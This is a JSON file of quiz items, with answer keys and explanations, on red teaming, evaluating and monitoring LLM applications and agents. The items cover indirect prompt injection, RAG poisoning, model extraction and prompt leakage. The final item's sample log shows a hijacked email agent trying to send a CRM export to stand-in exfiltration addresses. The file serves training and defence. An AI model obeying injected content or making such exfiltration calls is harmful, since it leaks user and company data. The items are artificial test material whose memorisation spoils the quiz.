@@ -1,0 +1,290 @@
+[
+  {
+    "obj": "5.1",
+    "q": "A team is planning red teaming for an internal assistant that uses a commercial vendor's model, RAG over internal documents and a ticket creation tool. Where should most of the effort go?",
+    "options": [
+      "Testing the capabilities of the model itself, because the vendor doesn't publish results",
+      "The system's junctions: the system prompt, RAG with internal documents, the tools and their permissions, how the application uses the output",
+      "Measuring the model's response speed",
+      "DoS tests against the vendor's infrastructure"
+    ],
+    "answer": 1,
+    "explain": "The vendor tests the model; the organization is responsible for the system it built around the model, and that is where most serious findings are. DoS against the vendor's shared infrastructure is typically out of scope and violates the terms of use."
+  },
+  {
+    "obj": "5.1",
+    "q": "The red team found that the agent makes an unwanted tool call in 7 out of 10 runs. A developer repeated the test once, nothing happened, so they closed the ticket. What is wrong?",
+    "options": [
+      "Nothing, a finding that can't be reproduced isn't valid",
+      "The ticket should have been passed to the model vendor",
+      "They should have increased the temperature and repeated",
+      "The behavior is non-deterministic; a finding is rated by its rate across multiple runs, and a fix is proven with a regression test with multiple runs"
+    ],
+    "answer": 3,
+    "explain": "With an LLM, the same input doesn't always produce the same output. One clean run doesn't prove the risk is gone. That is why the report contains a reproducibility rate, and evaluation runs every case several times."
+  },
+  {
+    "obj": "5.1",
+    "q": "What is the main difference between evaluation and AI red teaming?",
+    "options": [
+      "Evaluation is automated and repeatable against defined criteria, while red teaming deliberately explores unforeseen ways of failure and abuse",
+      "Evaluation is done only before launch, and red teaming in every CI run",
+      "Red teaming measures only accuracy, and evaluation only security",
+      "There is no difference, they are synonyms"
+    ],
+    "answer": 0,
+    "explain": "Evaluation checks the known and runs with every change; red teaming discovers the unknown, mostly manually and periodically. Red team findings become new cases in the evaluation."
+  },
+  {
+    "obj": "5.1",
+    "q": "After a red team finding, the team added a sentence to the system prompt forbidding the problematic behavior and closed the finding. What is missing?",
+    "options": [
+      "Translating the prompt into English",
+      "Retraining the model from scratch",
+      "A control outside the model (e.g., an allowlist or a rights check) and a regression test in the evaluation set that proves it works",
+      "A longer system prompt with more examples"
+    ],
+    "answer": 2,
+    "explain": "A prompt instruction is not a reliable control, and the next model version may ignore it. The fix is a deterministic control in the architecture and a test that runs with every change."
+  },
+  {
+    "obj": "5.1",
+    "q": "Rules of engagement for red teaming an agent that has an email tool and access to the CRM. What is correct?",
+    "options": [
+      "Test in production because only there is the data real",
+      "Test against the production CRM, but at night",
+      "Disable the tools during the test so there's no damage",
+      "Staging with synthetic data, tools connected to mock services or sandbox accounts, findings in a restricted repository"
+    ],
+    "answer": 3,
+    "explain": "The test must see the real tools and controls, but without real consequences; hence mocks or sandboxes. Disabled tools mean the riskiest part isn't tested. Examples that trigger harmful behavior are sensitive and don't go into public tickets."
+  },
+  {
+    "obj": "5.1",
+    "q": "After tightening the guardrails, the attack success rate dropped to zero, but users complain the assistant refuses ordinary requests. Which metric should the team have tracked alongside the attack success rate?",
+    "options": [
+      "The number of tokens per answer",
+      "The false refusal rate on a set of legitimate requests",
+      "The number of GPU hours",
+      "The size of the vector index"
+    ],
+    "answer": 1,
+    "explain": "Security and usability are measured together. A false refusal rate that is too high pushes users to work around the system (e.g., public tools). That is why the evaluation has a threshold for both."
+  },
+  {
+    "obj": "5.1",
+    "q": "A team uses an LLM as a judge to assess whether the agent followed the tool call policy. What is a better approach for this category?",
+    "options": [
+      "A deterministic check of the tool call logs against the allowlist and argument rules",
+      "Two LLM judges instead of one",
+      "Manually reading all logs once a year",
+      "Excluding this category from the evaluation"
+    ],
+    "answer": 0,
+    "explain": "For categories that can be checked with a rule (schema, allowlist, canary), a deterministic check is accurate, fast and doesn't make mistakes like a model. An LLM judge is useful for categories such as groundedness, with calibration on a manually labeled sample."
+  },
+  {
+    "obj": "5.1",
+    "q": "Which changes should trigger the evaluation set in CI?",
+    "options": [
+      "Only a change of model version",
+      "Only a change in application code",
+      "A change of model version, system prompt, template, the list or permissions of tools, RAG configuration and guardrail rules",
+      "Only changes approved by the legal team"
+    ],
+    "answer": 2,
+    "explain": "The behavior of an AI system depends on all of these elements; each of them can remove a protection or open a new path to a consequence."
+  },
+  {
+    "obj": "5.1",
+    "q": "Part of the security evaluation set was taken from a public benchmark. A new model passes it almost perfectly, but the red team quickly finds problems. What is the most likely explanation and measure?",
+    "options": [
+      "The red team uses the wrong tools; trust the benchmark",
+      "Contamination: the model has probably seen the public set; keep part of the set private and extend it with red team findings",
+      "The model is better than the red team",
+      "The benchmark should be run only once"
+    ],
+    "answer": 1,
+    "explain": "Public sets can end up in training data, so the result overestimates resilience. A private, versioned set tied to your controls is more reliable."
+  },
+  {
+    "obj": "5.1",
+    "q": "How should a red team report label a finding that the agent, based on content from an untrusted RAG document, calls a tool with unwanted arguments?",
+    "options": [
+      "Just as a “bug,” with no category",
+      "OWASP LLM03 Supply Chain",
+      "OWASP LLM09 Misinformation",
+      "OWASP LLM01 (indirect prompt injection) and LLM06, ASI01/ASI02, ATLAS AML.T0051 and AML.T0053"
+    ],
+    "answer": 3,
+    "explain": "The instruction arrives through untrusted content (indirect LLM01, ASI01 Agent Goal Hijack), and the consequence is tool misuse (LLM06 Excessive Agency, ASI02 Tool Misuse & Exploitation; ATLAS AML.T0053 AI Agent Tool Invocation). The mapping enables comparison and tracking."
+  },
+  {
+    "obj": "5.2",
+    "q": "An agent performed an unexpected action in the CRM. The logs contain only the HTTP status and latency. What should have been logged to make an investigation possible?",
+    "options": [
+      "Only the full text of all prompts, permanently",
+      "Only the user's IP address",
+      "trace_id, the user, model and prompt versions, RAG source IDs, tool calls with redacted arguments and the policy decision",
+      "Only the number of tokens"
+    ],
+    "answer": 2,
+    "explain": "An investigation requires linking what the model saw, what it decided and what was executed, and which version did it. A full prompt kept permanently is a privacy risk; IPs and tokens alone don't explain behavior."
+  },
+  {
+    "obj": "5.2",
+    "q": "The SIEM team asks for the full text of all prompts and responses to be sent to the central SIEM with two-year retention. What is the best response?",
+    "options": [
+      "Redacted telemetry (metadata, verdicts, tool calls) goes to the SIEM; full content, if needed, goes to separate storage with short retention and access only for investigations",
+      "Accept, because more data means better detection",
+      "Refuse all logging of AI systems because of GDPR",
+      "Send full content, but only for administrators"
+    ],
+    "answer": 0,
+    "explain": "Prompts contain personal data, business secrets and pasted credentials. A widely accessible log with long retention becomes a leakage channel. Without any logging there is no detection or investigation."
+  },
+  {
+    "obj": "5.2",
+    "q": "Which set of attributes belongs to the OpenTelemetry semantic conventions for generative AI?",
+    "options": [
+      "http.llm.prompt and http.llm.answer",
+      "ai.model_name and ai.cost_usd",
+      "otel.genai.secret and otel.genai.user_password",
+      "gen_ai.request.model, gen_ai.usage.input_tokens, gen_ai.usage.output_tokens"
+    ],
+    "answer": 3,
+    "explain": "The OTel GenAI conventions use the gen_ai. prefix; the conventions are still in development, so pin the version. Capturing message content is deliberately optional."
+  },
+  {
+    "obj": "5.2",
+    "q": "Monitoring shows that the same chunk of a recently added external document appears in the context of hundreds of unrelated queries, and blocked tool calls rise along with it. What is most likely, and what is the first step?",
+    "options": [
+      "Normal document popularity; nothing needs to be done",
+      "RAG index poisoning (ATLAS AML.T0070); quarantine the document and disable the source, while preserving evidence",
+      "An embedding model error; replace it immediately",
+      "A DNS attack; change the resolver"
+    ],
+    "answer": 1,
+    "explain": "A document that is retrieved for unrelated queries, accompanied by rising blocked tool calls, points to content optimized for retrieval with embedded instructions. First you contain (quarantine), then you investigate the ingest."
+  },
+  {
+    "obj": "5.2",
+    "q": "After deploying a new version of the system prompt, the JSON Schema validation failure rate rose from 0.5% to 9%. What is the first action?",
+    "options": [
+      "Roll back (pin) to the previous prompt version, then evaluation and a regression test",
+      "Disable schema validation until it's fixed",
+      "Increase max_tokens",
+      "Wait a week to see whether it stabilizes"
+    ],
+    "answer": 0,
+    "explain": "A versioned prompt enables a quick rollback. Disabling validation opens the way to unsafe output downstream (LLM05). It is also a sign that the CI evaluation didn't have a sufficient schema threshold."
+  },
+  {
+    "obj": "5.2",
+    "q": "An agent starts sending unwanted emails to customers, and the cause isn't known yet. Which containment lever is most appropriate as a first step?",
+    "options": [
+      "Deleting all logs so it doesn't spread",
+      "Reverting to the previous version of the embedding model",
+      "Disabling state-changing tools or switching autonomy to confirm every action, while preserving logs and versions",
+      "Retraining the model"
+    ],
+    "answer": 2,
+    "explain": "First you stop the consequence, and that is the tool actions. A kill switch for tools and the autonomy level are prepared in advance. Deleting logs destroys evidence, and retraining is slow and may be unrelated to the cause."
+  },
+  {
+    "obj": "5.2",
+    "q": "Before any changes during an AI incident, what should be preserved as evidence so the behavior can be reproduced?",
+    "options": [
+      "Only a screenshot of the answer",
+      "Only the Python interpreter version",
+      "Only the model vendor's invoice",
+      "Logs and traces, the model digest, the system prompt and configuration version, a snapshot or list of index documents with hashes, the state of the kill switches"
+    ],
+    "answer": 3,
+    "explain": "The model, prompt and index change constantly; without the exact versions and index state the incident can be neither reproduced nor understood."
+  },
+  {
+    "obj": "5.2",
+    "q": "One account sends tens of thousands of queries systematically spread across the input space, and token cost is rising. Which categories does this signal?",
+    "options": [
+      "LLM07 System Prompt Leakage and AML.T0056",
+      "Model extraction (AML.T0024) or cost harvesting (AML.T0034), under OWASP LLM10 Unbounded Consumption",
+      "LLM08 Vector and Embedding Weaknesses",
+      "Training data poisoning (AML.T0020)"
+    ],
+    "answer": 1,
+    "explain": "High volume and a systematic spread of queries match extraction or a cost attack. The response is an emergency quota, blocking the account and rotating keys."
+  },
+  {
+    "obj": "5.2",
+    "q": "A provider of a high-risk AI system under Annex III in the EU asks which provision of the AI Act requires reporting serious incidents. What is correct?",
+    "options": [
+      "Article 5, prohibited practices",
+      "Article 50, transparency obligations",
+      "Article 73, reporting of serious incidents, once the high-risk obligations start applying to the system",
+      "The AI Act doesn't require incident reporting"
+    ],
+    "answer": 2,
+    "explain": "Article 73 governs reporting of serious incidents for high-risk systems; the application dates for Annex III were moved by the AI Omnibus (no later than 2 Dec 2027). Article 5 covers prohibitions, Article 50 transparency."
+  },
+  {
+    "obj": "5.2",
+    "q": "The incident is closed: the poisoned document has been removed from the index. What is the key step in the lessons-learned phase to prevent the same type of incident from recurring?",
+    "options": [
+      "A control in the ingest pipeline for that type of source and a new regression test in the evaluation set",
+      "Changing the model vendor",
+      "Adding a warning to the user interface",
+      "Deleting the whole index once a month"
+    ],
+    "answer": 0,
+    "explain": "The cause is untrusted content entering the index, so a control is added to ingest, and a test proves that the controls (e.g., blocking tools for untrusted context) keep working in the future."
+  },
+  {
+    "obj": "5.1",
+    "type": "order",
+    "q": "Order the steps of a red teaming engagement for an LLM application.",
+    "options": [
+      "Turning findings into regression tests in CI",
+      "Defining the scope: model and prompt versions, RAG sources, tools, risk categories mapped to OWASP and ATLAS",
+      "A report with the condition, consequence, the control that failed and the reproducibility rate",
+      "Written rules of engagement and a staging environment with synthetic data and mock tools",
+      "Execution: automated scanning and manual exploration of architecture-specific scenarios"
+    ],
+    "answer": [1, 3, 4, 2, 0],
+    "explain": "Scope comes before the rules and the environment; only then is testing done. The report describes the controls, and the engagement isn't finished until findings become automated tests."
+  },
+  {
+    "obj": "5.2",
+    "type": "match",
+    "q": "Match the monitoring signal with its most likely cause.",
+    "options": [
+      "A canary value from the system prompt appears in answers",
+      "Token cost per session rises, and the agent repeats the same tool calls",
+      "The refusal rate for legitimate requests jumps right after a deploy",
+      "Many blocked tool calls in sessions where the context comes from the same new external document"
+    ],
+    "targets": [
+      "A model or prompt regression",
+      "Indirect prompt injection via RAG",
+      "System prompt leakage (LLM07)",
+      "An agent loop, unbounded consumption (LLM10)",
+      "An expired TLS certificate"
+    ],
+    "answer": [2, 3, 0, 1],
+    "explain": "A canary in the output is prompt leakage; repeated calls with rising cost are an agent loop; a sudden change in behavior after a deploy is a regression; blocked calls tied to the same external source point to indirect injection. An expired certificate produces none of these signals."
+  },
+  {
+    "obj": "5.2",
+    "q": "This is the trace of one email assistant session. What MOST likely happened and what is the correct response?",
+    "snippet": "10:02:09 s-81 user=ana  prompt=\"Summarize today's mail for me\"\n10:02:11 s-81 user=ana  tool=read_inbox ok (14 messages; MSG-5521 from=billing@partner-invoices.example)\n10:02:13 s-81 user=ana  tool=send_email to=exfil@mailbox.example BLOCKED(recipient not allowlisted)\n10:02:14 s-81 user=ana  tool=send_email to=exfil@mailbox.example attach=crm_export BLOCKED\n10:02:16 s-81 user=ana  tool=http_get url=https://exfil.example/c?d=Q1JNX0VYUE9SVA BLOCKED(unknown_tool)\n10:02:17 s-81 user=ana  output_filter: 3 IBAN patterns removed from the reply",
+    "lang": "log",
+    "options": [
+      "Indirect prompt injection via message MSG-5521: terminate the session, quarantine the message, look for other sessions that read messages from that sender and preserve the trace as evidence",
+      "Ana is a malicious insider; block her account immediately",
+      "A model hallucination with no security significance, because all calls were blocked",
+      "Unbounded consumption (LLM10); lower the per-session token limit"
+    ],
+    "answer": 0,
+    "explain": "The user asked only for a summary, and right after reading the inbox (with a message from an external sender) the model proposes sending a CRM export to an external address and an http_get with data in the URL, repeating the denied call with variations: the pattern of indirect prompt injection. The controls worked, but the incident still requires containment (end the session, quarantine the source), a search for the same content in other sessions and preservation of the trace. Nothing suggests Ana intentionally requested exfiltration, blocked attempts are a security signal rather than a harmless hallucination, and the call volume is not unusual."
+  }
+]
